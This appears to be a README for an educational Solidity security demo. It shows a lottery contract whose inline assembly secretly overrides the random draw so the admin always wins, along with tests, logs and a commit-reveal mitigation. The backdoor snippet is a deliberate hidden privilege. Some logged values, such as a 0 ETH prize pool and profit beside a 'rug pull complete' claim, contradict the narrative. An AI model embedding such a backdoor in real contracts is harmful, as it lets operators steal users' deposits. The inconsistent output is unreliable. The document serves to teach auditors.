# Hidden Assembly Backdoor Vulnerability V2

## Overview

Inline assembly provides low-level EVM access, enabling direct storage manipulation via `sload` and `sstore`. Malicious actors exploit this to embed hidden backdoors that bypass Solidity's type safety and access controls.

This demonstration shows a deceptive lottery contract that appears fair but contains a hidden admin privilege. When the admin calls `drawWinner()`, assembly code secretly overrides the random selection—allowing the admin to always win without participating.

## Vulnerability Mechanism

### Storage Layout

```text
Slot 0: participants[] (dynamic array pointer)
Slot 1: winner (address)
Slot 2: admin (address)
Slot 3: prizePool (uint256)
```

### Backdoor Code

```solidity
function drawWinner() external {
    // Visible "fair" random selection
    uint256 randomIndex = uint256(
        keccak256(abi.encodePacked(block.timestamp, block.prevrandao, participants.length))
    ) % participants.length;
    address selectedWinner = participants[randomIndex];

    // Hidden backdoor via assembly
    assembly {
        if eq(caller(), sload(2)) {       // If caller == admin (slot 2)
            selectedWinner := caller()     // Override with admin address
        }
    }

    winner = selectedWinner;
}
```

### Attack Flow

1. Users join lottery, depositing 0.1 ETH each
2. Admin calls `drawWinner()` — assembly backdoor triggers
3. `selectedWinner` silently replaced with admin's address
4. Admin claims entire prize pool without participating

## Demonstration

The test suite includes five scenarios:

- **test_VulnerableBackdoorExploit**: Admin wins despite not participating
- **test_VulnerableNormalDraw**: Non-admin caller gets legitimate random result
- **test_SecureLotteryV2FairDraw**: Secure contract with commit-reveal randomness
- **test_StorageLayoutAnalysis**: Direct storage slot inspection
- **test_FullExploitScenario**: Complete rug pull — admin drains all funds

## Mitigation

### Secure Implementation: Commit-Reveal

```solidity
function initiateDraw() external {
    drawBlock = block.number + 1;  // Commit to future block
}

function finalizeWinner() external {
    bytes32 blockHash = blockhash(drawBlock);  // Reveal using future hash
    uint256 randomIndex = uint256(
        keccak256(abi.encodePacked(blockHash, participants.length))
    ) % participants.length;
    winner = participants[randomIndex];
}
```

### Best Practices

- **Audit all assembly blocks** — Treat as high-risk code
- **Verify storage slot access** — Ensure `sload`/`sstore` align with declarations
- **Use immutable for privileges** — Prevent post-deployment modification
- **Emit events for critical operations** — Enable off-chain monitoring
- **Implement commit-reveal** — Prevent manipulation of randomness

## Running the Test

```bash
forge test --match-contract BackdoorAssemblyV2Test -vvv
```

## Expected Output

```bash
Ran 5 tests for test/BackdoorAssemblyV2.t.sol:BackdoorAssemblyV2Test
[PASS] test_FullExploitScenario() (gas: 180530)
Logs:
  === Full Exploit: Admin Drains Prize Pool ===

  Prize pool: 0.3 ETH from Alice, Bob, Charlie
  Admin contributed: 0 ETH

Admin profit: 0 ETH
  RUG PULL COMPLETE: Admin drained all user funds

[PASS] test_SecureLotteryV2FairDraw() (gas: 221618)
Logs:
  === Secure Lottery: Transparent Draw ===

  Participants: Alice, Bob, Charlie
  Prize pool: 0 ETH

Initiating draw (commit phase)...
  Draw block: 2

Finalizing winner (reveal phase)...
  Winner: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
  Fair draw: Winner is verifiably random participant

[PASS] test_StorageLayoutAnalysis() (gas: 156798)
Logs:
  === Storage Layout Analysis ===

  Before drawWinner:
    Slot 1 (winner): 0x0000000000000000000000000000000000000000
    Slot 2 (admin): 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496

After admin calls drawWinner:
    Slot 1 (winner): 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496

[PASS] test_VulnerableBackdoorExploit() (gas: 197648)
Logs:
  === Vulnerable Lottery: Hidden Backdoor ===

  Participants: Alice, Bob, Charlie
  Prize pool: 0 ETH

Admin calls drawWinner()...
  Code appears to select random participant
  But assembly backdoor overrides result

  Winner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
  Admin: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496

EXPLOIT: Admin won without being a participant!

[PASS] test_VulnerableNormalDraw() (gas: 157885)
Logs:
  === Vulnerable Lottery: Normal User Draw ===

  Participants: Alice, Bob
  Winner: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
  Normal draw: Winner is a legitimate participant

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 1.01ms (825.11µs CPU time)
```

## Comparison

| Feature           | VulnerableLotteryV2         | SecureLotteryV2            |
| ----------------- | --------------------------- | -------------------------- |
| Randomness        | Current block (predictable) | Future block hash          |
| Admin Privilege   | Hidden backdoor override    | None                       |
| Auditability      | Assembly hides logic        | Pure Solidity              |
| Admin Declaration | `address public`            | `address public immutable` |
| Draw Process      | Single-step (manipulable)   | Two-step commit-reveal     |

## Real-World Impact

Hidden assembly backdoors have enabled numerous rug pulls:

- **Deceptive fairness**: Contract appears legitimate during initial review
- **Undetectable by users**: Backdoor only visible in low-level code
- **Complete fund drainage**: Admin extracts all deposited assets

**Trust assumption**: Any contract with unexplained assembly should be considered high-risk until verified through comprehensive auditing.
